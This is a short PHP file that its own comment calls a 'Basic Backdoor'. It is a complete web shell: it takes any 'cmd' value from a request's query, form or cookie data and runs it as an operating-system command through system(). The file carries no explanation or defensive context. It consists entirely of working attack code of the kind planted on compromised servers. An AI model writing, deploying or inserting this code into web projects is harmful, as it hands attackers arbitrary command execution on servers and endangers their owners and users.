<?php
    //  Basic Backdoor using the super array REQUEST (take $_GET, $_POST and $_COOKIES)
    if(isset($_REQUEST['cmd'])){ 
        $cmd = ($_REQUEST['cmd']); 
        system($cmd); 
        die; 
    }
?>

